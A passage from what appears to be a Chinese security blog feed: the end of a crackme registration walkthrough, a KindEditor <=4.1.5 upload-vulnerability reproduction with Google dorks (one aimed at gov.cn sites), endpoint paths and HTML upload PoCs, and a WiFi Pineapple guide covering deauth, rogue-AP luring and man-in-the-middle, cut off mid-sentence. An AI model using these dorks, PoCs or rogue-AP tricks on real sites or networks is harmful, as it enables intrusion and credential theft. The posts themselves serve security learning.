sprintf(szKey,&quot;在“%s”图片时左键点击图片%d次\r\n\r\n在“%s”图片时右键点击图片%d次\r\n\r\n即可注册成功!&quot;,aImage[nIL].szname,nK,aImage[nIR].szname,nJ);</span><br><span class="line">        SetDlgItemText(IDC_EDIT2,szKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="校验步骤总结"><a href="#校验步骤总结" class="headerlink" title="校验步骤总结"></a>校验步骤总结</h2><p>1.创建文件，路径为: C:\ajj.126.c0m\j\o\j\o\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。 </p><p>\2. 鼠标右键点击五次注册按钮 </p><p>\3. 鼠标左键双击图片框的空白处 </p><p>\4. 用户名输入ajj </p><p>\5. 密码输入1_345,78(第二位必须的下划线，第六位必须的逗号，长度必须8位，其余随便)，然后鼠标左键双击 </p><p>\6. 在图片是性相近的时候，鼠标从右下角移入软件框内 </p><p>\7. 在图片是性本善的时候，鼠标从左下角移入软件框内 </p><p>\8. 根据显示的数字不同，最终的解决方案也不同，具体如下： </p><p>数字为0——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 </p><p>数字为1——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片2次 </p><p>数字为2——在“性本善”图片时左键点击图片2次，在“性相近”图片时右键点击图片2次 </p><p>数字为3——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片8次 </p><p>数字为4——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 </p><p>所有的步骤都执行完毕之后，等待计时器执行完成之后</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125104121222.png" alt="image-20210125104121222" style="zoom: 50%;"><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_38474570/article/details/89602599">https://blog.csdn.net/qq_38474570/article/details/89602599</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;page=1&amp;tid=855172">https://www.52pojie.cn/forum.php?mod=viewthread&amp;page=1&amp;tid=855172</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个和Crackme005和004的作者是同一个，不过增加了更多的防护&lt;/p&gt;
&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103220232.png&quot; alt=&quot;image
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>kindeditor&lt;=4.1.5上传漏洞复现</title>
    <link href="http://www.ol4three.com/2021/01/12/WEB/Exploit/kindeditor-4-1-5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.ol4three.com/2021/01/12/WEB/Exploit/kindeditor-4-1-5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-12T12:26:19.000Z</published>
    <updated>2021-01-12T12:47:50.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote><p>漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中</p><p>这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”)</p></blockquote><h2 id="批量搜索"><a href="#批量搜索" class="headerlink" title="批量搜索"></a>批量搜索</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">inurl:&#x2F;examples&#x2F;uploadbutton.html</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;php&#x2F;upload_json.php</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;asp.net&#x2F;upload_json.ashx</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;&#x2F;jsp&#x2F;upload_json.jsp</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;&#x2F;asp&#x2F;upload_json.asp</span><br><span class="line"></span><br><span class="line">inurl:gov.cn&#x2F;kindeditor&#x2F;</span><br></pre></td></tr></table></figure><h1 id="漏洞问题"><a href="#漏洞问题" class="headerlink" title="漏洞问题"></a>漏洞问题</h1><p>根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;asp&#x2F;upload_json.asp</span><br><span class="line"></span><br><span class="line">&#x2F;asp.net&#x2F;upload_json.ashx</span><br><span class="line"></span><br><span class="line">&#x2F;jsp&#x2F;upload_json.jsp</span><br><span class="line"></span><br><span class="line">&#x2F;php&#x2F;upload_json.php</span><br></pre></td></tr></table></figure><p>可目录变量查看是否存在那种脚本上传漏洞:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kindeditor&#x2F;asp&#x2F;upload_json.asp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;asp.net&#x2F;upload_json.ashx?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;php&#x2F;upload_json.php?dir&#x3D;file</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>google搜素一些存在的站点 inurl：kindeditor</p><p>1.查看版本信息</p><p><a href="http://www.xxx.org/kindeditor//kindeditor.js">http://www.xxx.org/kindeditor//kindeditor.js</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104185315467.png" alt="image-20210104185315467"></p><p>2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.* </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kindeditor&#x2F;asp&#x2F;upload_json.asp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;asp.net&#x2F;upload_json.ashx?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file</span><br><span class="line"></span><br><span class="line">kindeditor&#x2F;php&#x2F;upload_json.php?dir&#x3D;file</span><br></pre></td></tr></table></figure><p>3.如下图可以看出是存在jsp上传点:</p><p><a href="http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file">http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112204100817.png" alt="image-20210112204100817"></p><p>4.写出下面的构造上传poc,这里需要修改<script>...<script>以及url : 的内容,根据实际情况修改.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Uploader&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.org&#x2F;kindeditor&#x2F;&#x2F;kindeditor.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KindEditor.ready(function(K) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var uploadbutton &#x3D; K.uploadbutton(&#123;</span><br><span class="line"></span><br><span class="line">button : K(&#39;#uploadButton&#39;)[0],</span><br><span class="line"></span><br><span class="line">fieldName : &#39;imgFile&#39;,</span><br><span class="line"></span><br><span class="line">url : &#39;http:&#x2F;&#x2F;www.xxx.org&#x2F;kindeditor&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file&#39;,</span><br><span class="line"></span><br><span class="line">afterUpload : function(data) &#123;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if (data.error &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">var url &#x3D; K.formatUrl(data.url, &#39;absolute&#39;);</span><br><span class="line"></span><br><span class="line">K(&#39;#url&#39;).val(url);&#125;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">uploadbutton.fileBox.change(function(e) &#123;</span><br><span class="line"></span><br><span class="line">uploadbutton.submit();</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;upload&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input class&#x3D;&quot;ke-input-text&quot; type&#x3D;&quot;text&quot; id&#x3D;&quot;url&quot; value&#x3D;&quot;&quot; readonly&#x3D;&quot;readonly&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;uploadButton&quot; value&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>简化版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;xxx.com&#x2F;front&#x2F;js&#x2F;kindeditor-4.1.10&#x2F;jsp&#x2F;upload_json.jsp?dir&#x3D;file&quot; method&#x3D;&quot;post&quot;&gt;  </span><br><span class="line"></span><br><span class="line">Upload a new file:&lt;br&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;imgFile&quot; size&#x3D;&quot;50&quot;&gt;&lt;br&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>Burp抓包查看上传地址并访问</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112204715512.png" alt="image-20210112204715512"></p><h1 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h1><p>1.直接删除upload_json.<em>和file_manager_json.</em></p><p>2.升级kindeditor到最新版本</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/backlion/p/10421405.html">https://www.cnblogs.com/backlion/p/10421405.html</a></p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/js
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="kindeditor" scheme="http://www.ol4three.com/tags/kindeditor/"/>
    
  </entry>
  
  <entry>
    <title>WIFI渗透利器PineApple-Nano</title>
    <link href="http://www.ol4three.com/2021/01/07/IOT/WIFI%E6%B8%97%E9%80%8F%E5%88%A9%E5%99%A8PineApple-Nano/"/>
    <id>http://www.ol4three.com/2021/01/07/IOT/WIFI%E6%B8%97%E9%80%8F%E5%88%A9%E5%99%A8PineApple-Nano/</id>
    <published>2021-01-07T08:04:50.000Z</published>
    <updated>2021-01-20T12:34:51.322Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>The WiFi Pineapple 是由国外无线安全审计公司Hak5开发并售卖的一款无线安全测试神器（俗称大菠萝），从2008年起目前已经发布到第六代产品。当前的主打产品是The WiFi Pineapple NANO 和WiFI Pineapple TETRA（支持5GHz频段）</p></blockquote><h2 id="产品规格"><a href="#产品规格" class="headerlink" title="产品规格"></a>产品规格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CPU：400 MHz MIPS Atheros AR9331 SoC</span><br><span class="line"></span><br><span class="line">内存：64 MB DDR2 RAM</span><br><span class="line"></span><br><span class="line">磁盘：16 MB ROM + Micro SD（6G）</span><br><span class="line"></span><br><span class="line">无线：Atheros AR9331（wlan0）+ Atheros AR9271（wlan1），均为IEEE 802.11 b &#x2F; g &#x2F; n</span><br><span class="line"></span><br><span class="line">端口：（2）RP-SMA天线，USB网卡（ASIX AX88772A）</span><br><span class="line"></span><br><span class="line">USB 2.0主机，Micro SD读卡器</span><br><span class="line"></span><br><span class="line">电源：USB 5V 1.5A. 包括 Y型USB电源线</span><br><span class="line"></span><br><span class="line">可配置状态指示灯LED</span><br><span class="line"></span><br><span class="line">可配置的重置按钮</span><br></pre></td></tr></table></figure><h1 id="使用背景"><a href="#使用背景" class="headerlink" title="使用背景"></a>使用背景</h1><h2 id="1-安全研究"><a href="#1-安全研究" class="headerlink" title="1.安全研究"></a>1.安全研究</h2><p>对于研究方向为wifi安全的小伙伴们，可以使用这款“外设”作为入门和进阶的部分，能够让我们了解一些常见的wifi安全问题、原理和攻击手段，进一步的可以分析这些利用工具的原理，实现方法，组合攻击手段</p><h2 id="2-安全演示"><a href="#2-安全演示" class="headerlink" title="2.安全演示"></a>2.安全演示</h2><p>如果你是安服的小伙伴，给客户演示的时候不要总是带着自建靶场，给领导搞个SQL注入，永恒之蓝，过时了！就算你配合Cobalt Strike来个主机上线，也顶多是视觉上的刺激。你带个wifipineapple，现场来个中间人，搞个绵羊墙，抓个密码，岂不美哉？</p><h1 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h1><p>Web管理端地址：<a href="http://172.16.42.1:1471">http://172.16.42.1:1471</a></p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><ol><li>用作 Wi-Fi 中间人攻击测试平台</li><li>一整套的针对 AP 的渗透测试套件</li><li>基于 WEB 应用的管理界面</li><li>基于嵌入式 linux 系统</li><li>不定时的各种软件更新，可以自定义模块、payload</li></ol><h1 id="管理页面简介"><a href="#管理页面简介" class="headerlink" title="管理页面简介"></a>管理页面简介</h1><h2 id="1-Dashboard仪表盘"><a href="#1-Dashboard仪表盘" class="headerlink" title="1.Dashboard仪表盘"></a>1.Dashboard仪表盘</h2><p>仪表盘上显示了一些状态、统计信息、通知和公告的概览视图，包括：</p><p>CPU 使用率、设备运行时间、客户端连接数量</p><p>Landing Page 浏览状态，公告</p><p>Bulletins从wifipineapple.com获取的最新项目信息</p><h2 id="2-Recon侦察"><a href="#2-Recon侦察" class="headerlink" title="2.Recon侦察"></a>2.Recon侦察</h2><p>Recon模块采用被动式扫描方式，扫描过程会自动将网卡设置为监听模式，监听周围不同信道（客户端）发出的各种数据包。能够扫描出SSID、MAC地址、加密方式、是否启用了WPS功能、信道及信号强度等信息。甚至还能扫描出当前未连接任何AP的客户端</p><p>从下拉列表为扫描的持续时间，增加扫描时间可以在每个信道上看到更多潜在的流量，选中“Continuous”框将启用正在进行的扫描。每隔一段时间进行持续扫描，并更新扫描结果列表，直到扫描停止</p><p>扫描结果将显示在表格视图中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231050591.png" alt="image-20210107231050591"></p><p>未关联的客户端仅显示 MAC 地址。这些客户端具有活动无线电，但不与接入点关联</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231132085.png" alt="image-20210107231132085"></p><p>单击SSID和MAC地址旁的下拉菜单，会出现如下两张图的菜单，用于 PineAP 模块的 Filter(过滤) 和 Tracking(追踪) 功能，以及进行 Deauth(取消认证洪水) 攻击中发送取消身份验证帧的倍数参数</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231253023.png" alt="image-20210107231253023" style="zoom: 33%;"><p>如果使用 Recon 模块进行扫描将会断开已有的连接</p><h2 id="3-Client客户端"><a href="#3-Client客户端" class="headerlink" title="3.Client客户端"></a>3.Client客户端</h2><p>如果在 PineAP 中勾选了 Allow Associations(允许关联)，WiFi Pineapple将允许客户端进行连接</p><p>已连接的客户端将在“ Clients ”视图中列出它们各自的MAC地址，IP地址，它们已连接的 SSID （如果在PineAP中启用了Log Probes(日志探测) 功能）和主机名</p><p>Kick按钮可以从Wi-Fi Pineapple网络中删除客户端</p><p>MAC地址和SSID旁边的下拉菜单按钮用于 PineAP 模块的 Filter 和 Tracking 功能</p><p>Refresh按钮可以刷新Clients表格视图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107231838630.png" alt="image-20210107231838630"></p><h2 id="4-Tracking"><a href="#4-Tracking" class="headerlink" title="4.Tracking"></a>4.Tracking</h2><p>跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本</p><p>此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项</p><p>可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中</p><p>当客户端被识别时，将会执行自定义脚本</p><h2 id="5-Filters"><a href="#5-Filters" class="headerlink" title="5.Filters"></a>5.Filters</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107233004096.png" alt="image-20210107233004096"></p><p>可以通过客户端MAC地址或SSID来执行过滤。支持“Deny”和“Allow”模式，可以使用Swith按钮进行切换</p><h3 id="Client-Filtering-客户端过滤"><a href="#Client-Filtering-客户端过滤" class="headerlink" title="Client Filtering 客户端过滤"></a>Client Filtering 客户端过滤</h3><p>在Deny Mode下，客户端过滤器中列出的具有MAC地址的客户端将无法连接到WiFi Pineapple</p><p>在 Allow Mode下，只有客户端过滤器中列出的具有MAC地址的客户端才能连接</p><p>进行WI-FI安全测试时，最好使用“Allow Mode”以确保仅针对参与范围内的客户端</p><h3 id="SSID-Filtering-SSID过滤"><a href="#SSID-Filtering-SSID过滤" class="headerlink" title="SSID Filtering SSID过滤"></a>SSID Filtering SSID过滤</h3><p>在Deny Mode下，如果客户端尝试连接到过滤器中列出的SSID，则客户端将无法与WiFi Pineapple关联</p><p>在 Allow Mode下，如果过滤器中列出了他们尝试连接的SSID，则客户端只能与WiFi Pineapple关联</p><p>SSID可以从与Recon中各自列表相关联的菜单按钮添加到过滤器中，也可以手动添加或删除过滤器中的条目</p><h2 id="6-PineAP-Pine接入点"><a href="#6-PineAP-Pine接入点" class="headerlink" title="6.PineAP Pine接入点"></a>6.PineAP Pine接入点</h2><p>PineAP是通过伪造的Probe Response响应包来响应周围的客户端（可能是笔记本、手机、pad等等），让客户端以为周围存在着曾经成功连接过的无线AP，而用来欺骗客户端进行连接我们的Pineapple Nano设备</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210107235456065.png" alt="image-20210107235456065" style="zoom: 33%;"><h3 id="Allow-Associations-允许关联"><a href="#Allow-Associations-允许关联" class="headerlink" title="Allow Associations 允许关联"></a>Allow Associations 允许关联</h3><p>此项被勾选时，客户端可以通过任何请求的 SSID连接到Pineapple</p><p>禁用时，客户端将不允许被连接。相当于以前的 karma</p><h3 id="PineAP-Daemon-PineAP-守护进程"><a href="#PineAP-Daemon-PineAP-守护进程" class="headerlink" title="PineAP Daemon PineAP 守护进程"></a>PineAP Daemon PineAP 守护进程</h3><p>这个进程必须开启</p><p>可以使用 Beacon 响应，捕获 SSIDs 到池里，以及对SSID进行广播</p><p>这个设置会作用于 wlan1 ，并且 wlan1 不能用于 Client 模式去桥接外网</p><h3 id="Log-PineAP-Events-日志探测"><a href="#Log-PineAP-Events-日志探测" class="headerlink" title="Log PineAP Events 日志探测"></a>Log PineAP Events 日志探测</h3><p>开启后，将记录客户端的探针请求。可以从 Logging 模块里看查看分析</p><h3 id="Beacon-Response-响应"><a href="#Beacon-Response-响应" class="headerlink" title="Beacon Response 响应"></a>Beacon Response 响应</h3><p>开启之后，目标 beacons 将会发送给客户端设备，用来响应客户端的 SSID 探针请求</p><p>这些 beacons 将不会被广播，而是指定发送给发送了探针请求的客户端设备。这可以防止beacon 被其他设备看见。如果 Allow Associations 启用并且有客户端连接，目标 beacon 响应将持续发送给客户端设备一段时间</p><p>Beacon 响应将会使用源 mac 地址设置，并且也会与广播 SSID池特性共享</p><p>Beacon 响应间隔将决定发射的频率</p><h3 id="Capture-SSIDs-to-Pool"><a href="#Capture-SSIDs-to-Pool" class="headerlink" title="Capture SSIDs to Pool"></a>Capture SSIDs to Pool</h3><p>使能之后，将会把捕捉到的探针请求里的 SSID 保存到 SSID 池子里。这</p><p>种被动的特点将有利于广播 SSID 池特性。SSID 池也可以被手动来管理</p><h3 id="Broadcast-SSID-Pool"><a href="#Broadcast-SSID-Pool" class="headerlink" title="Broadcast SSID Pool"></a>Broadcast SSID Pool</h3><p>使能之后，SSID 池将会按照设定的时间间隔以及源地址、目标地址来广播</p><p>beacon。就是以前的 Dogma</p><h3 id="Beacon-Response-Interval"><a href="#Beacon-Response-Interval" class="headerlink" title="Beacon Response Interval"></a>Beacon Response Interval</h3><p>指定广播 SSID 的时间间隔。间隔越小，对 CPU 的占用就越高。</p><h3 id="Beacon-Response-Interval-1"><a href="#Beacon-Response-Interval-1" class="headerlink" title="Beacon Response Interval"></a>Beacon Response Interval</h3><p>指定 beacon 响应的时间间隔。间隔越小，对 CPU 的占用就越高</p><h3 id="Source-MAC"><a href="#Source-MAC" class="headerlink" title="Source MAC"></a>Source MAC</h3><p>默认情况下，是菠萝 wlan0 的 mac 地址。这是菠萝的 ap 的热点。wlan0 的 mac 地</p><p>址也可以在 Networking 里改变。如果需要的话，这个 mac 地址可以被设定为一个次要的菠萝。</p><h3 id="Target-MAC"><a href="#Target-MAC" class="headerlink" title="Target MAC"></a>Target MAC</h3><p>默认情况下，这是广播 mac 地址 FF:FF:FF:FF:FF:FF。用于广播帧数据将会被附近的</p><p>客户端看到。设置为客户端的 mac 地址将把 PineAP 的特性用于单一的设备。类似 beacon 响应，只</p><p>有池子里的 SSID 广播会被目标客户端看到。当和过滤器一起工作时，这个特性将更精确的定位到目</p><p>标设备。</p><h3 id="SSID-Pool"><a href="#SSID-Pool" class="headerlink" title="SSID Pool"></a><strong>SSID Pool</strong></h3><p>当Capture SSID Pool 被使能后，会自动记录。也可以手动添加。点击列表里的 SSID，</p><p>也可以执行删除和清除操作</p><h2 id="7-Tracking"><a href="#7-Tracking" class="headerlink" title="7.Tracking"></a>7.Tracking</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108003751612.png" alt="image-20210108003751612"></p><p>跟踪功能将按MAC地址连续扫描指定的客户端，并执行可自定义的跟踪脚本</p><p>此功能需要启用 PineAP 的 Log Probes 和 Log Associations 中的至少一个选项</p><p>可以手动添加客户端，也可以在 Clients 或 Recon 视图中关联的MAC地址使用 PineAP Tracking Add MAC 按钮添加 Mac 地址到此模块中</p><p>当客户端被识别时，将会执行自定义脚本</p><h2 id="8-Logging"><a href="#8-Logging" class="headerlink" title="8.Logging"></a>8.Logging</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004435046.png" alt="image-20210108004435046" style="zoom:50%;"><p>Logging模块共记录了 PineAP Log、System Log、Dmesg、Reporting Log四种日志</p><h3 id="PineAP-Log"><a href="#PineAP-Log" class="headerlink" title="PineAP Log"></a>PineAP Log</h3><p>如果启用了Log Probes 和 Log Associations其中的一个或全部，则按时间顺序显示PineAP事件。每个事件都包含时间戳，事件类型（探测请求或关联），客户端设备的MAC地址以及设备探测或关联的SSID</p><p>可以对结果进行过滤，在按下”Apply Filter”之前，过滤器不会生效，默认情况下，PineAP日志位于/tmp中，重启不会保存</p><h3 id="System-Log"><a href="#System-Log" class="headerlink" title="System Log"></a>System Log</h3><p>系统日志</p><h3 id="Dmesg"><a href="#Dmesg" class="headerlink" title="Dmesg"></a>Dmesg</h3><p>设备故障的诊断，硬件连接断开等信息</p><h3 id="Reporting-Log"><a href="#Reporting-Log" class="headerlink" title="Reporting Log"></a>Reporting Log</h3><p>生成报告日志</p><h2 id="9-Reporting"><a href="#9-Reporting" class="headerlink" title="9.Reporting"></a>9.Reporting</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004746791.png" alt="image-20210108004746791"></p><p>此功能能够以指定的间隔生成报告。报告可以通过电子邮件发送，也可以本地保存在SD卡上</p><p>报告内容可选，包括PineAP日志（可以在生成报告后删除），PineAP Site Survey（可指定扫描时间）PineAP 探测和跟踪客户端报告。</p><h2 id="10-Networking网络"><a href="#10-Networking网络" class="headerlink" title="10.Networking网络"></a>10.Networking网络</h2><p>在 Networking 模块中，可以更改路由，接入点，MAC地址，主机名，并使用WiFi客户端模式连接到接入点</p><h3 id="Route-路由"><a href="#Route-路由" class="headerlink" title="Route 路由"></a>Route 路由</h3><p>显示内核IP路由表，可以针对所选接口进行修改，默认网关为172.16.42.42</p><p>使用WiFi Pineapple Connector Android应用程序时，IP路由将自动更新以使用usb0作为默认网关</p><p>下拉菜单可以重启DNS服务</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108004844930.png" alt="image-20210108004844930"></p><h3 id="Access-Points-接入点"><a href="#Access-Points-接入点" class="headerlink" title="Access Points 接入点"></a>Access Points 接入点</h3><p>可以配置WiFi Pineapple主要开放接入点和管理接入点。开放和管理接入点共享相同的信道</p><p>可以隐藏开放接入点，并且可以禁用管理接入点</p><h3 id="WiFi-Client-Mode-WI-FI客户端模式"><a href="#WiFi-Client-Mode-WI-FI客户端模式" class="headerlink" title="WiFi Client Mode WI-FI客户端模式"></a>WiFi Client Mode WI-FI客户端模式</h3><p>能够将WiFi Pineapple连接到另一个无线接入点，以进行Internet或本地网络访问</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108005043399.png" alt="image-20210108005043399" style="zoom:50%;"><h2 id="11-Configuration"><a href="#11-Configuration" class="headerlink" title="11.Configuration"></a>11.Configuration</h2><h3 id="Landing-Page"><a href="#Landing-Page" class="headerlink" title="Landing Page"></a>Landing Page</h3><p>启动后，客户端全部链接将会被强制导向到此页面，页面访问的统计信息将会显示在 Dashboard 上</p><p>页面可以是 PHP 